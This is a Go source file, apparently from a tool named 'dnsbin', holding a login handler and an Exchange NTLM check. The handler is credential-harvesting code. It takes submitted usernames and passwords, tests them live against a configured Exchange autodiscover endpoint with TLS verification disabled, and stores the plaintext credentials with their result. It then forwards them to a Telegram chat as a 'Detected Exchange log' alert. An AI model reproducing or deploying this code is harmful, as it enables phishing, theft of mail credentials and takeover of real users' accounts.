package api

import (
	"crypto/tls"
	"dnsbin/core"
	db "dnsbin/db/sqlc"
	"dnsbin/ipwry"
	"dnsbin/notify"
	"dnsbin/util"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strconv"

	"github.com/gin-gonic/gin"
)

type loginUserRequest struct {
	Username string `form:"username" binding:"required,alphanum"`
	Password string `form:"password" binding:"required,min=6"`
}

func (server *Server) loginUser(ctx *gin.Context) {
	var req loginUserRequest
	if err := ctx.ShouldBindQuery(&req); err != nil {
		ctx.JSON(200, gin.H{
			"code":    http.StatusBadRequest,
			"success": false,
			"data":    err.Error(),
		})
		return
	}

	clientIp := ctx.ClientIP()
	location, err := ipwry.Query(clientIp)
	if err != nil {
		ctx.JSON(200, gin.H{
			"code":    http.StatusBadRequest,
			"success": false,
			"data":    err.Error(),
		})
		return
	}

	statusCode, err := ValidateExchange(server.config.Endpoint, server.config.ProxyURL, req.Username, req.Password, ctx.Request.UserAgent(), server.config.Insecure)
	if err != nil {
		ctx.JSON(200, gin.H{
			"code":    http.StatusUnauthorized,
			"success": false,
			"data":    err.Error(),
		})
		return
	}

	dnsLog, err := server.store.CreateDNSLog(ctx, db.CreateDNSLogParams{
		Type:           "Exchange",
		DnsQueryRecord: req.Username + ":" + req.Password + ":" + strconv.Itoa(statusCode),
		Location:       location,
		IpAddress:      clientIp,
	})
	if err != nil {
		ctx.JSON(http.StatusOK, gin.H{
			"code":    http.StatusInternalServerError,
			"success": false,
			"data":    err.Error(),
		})
		return
	}

	err = server.telegram.SendMarkdown("*🔥 Detected "+dnsLog.Type+" log*", notify.RenderDNSInfo(&notify.DNSLogInfo{
		Type:           dnsLog.Type,
		DnsQueryRecord: dnsLog.DnsQueryRecord,
		Location:       dnsLog.Location,
		IpAddress:      dnsLog.IpAddress,
		Time:           dnsLog.CreatedAt,
	}))
	if err != nil {
		ctx.JSON(http.StatusOK, gin.H{
			"code":    http.StatusBadRequest,
			"success": false,
			"data":    err.Error(),
		})
		return
	}

	ctx.JSON(http.StatusOK, gin.H{
		"code":    http.StatusOK,
		"success": true,
		"data": gin.H{
			"status":   statusCode,
			"username": req.Username,
			"ip":       dnsLog.IpAddress,
			"location": dnsLog.Location,
		},
	})
}

func ValidateExchange(autodiscoverURL, proxyURL, user, password, userAgent string, insecure bool) (int, error) {
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true}
	if proxyURL != "" {
		if p, err := url.Parse(proxyURL); err == nil {
			tr.Proxy = http.ProxyURL(p)
		}
	}

	jar, _ := cookiejar.New(nil)
	client := &http.Client{Transport: tr}

	client.Transport = &core.NtlmTransport{
		Domain:    "",
		User:      user,
		Password:  password,
		CookieJar: jar,
		Insecure:  insecure,
		Proxy:     proxyURL,
		Hostname:  util.RandomString(10),
	}

	req, err := http.NewRequest("GET", autodiscoverURL, nil)
	if err != nil {
		return -1, err
	}
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		return -1, err
	}
	defer resp.Body.Close()
	return resp.StatusCode, nil
}
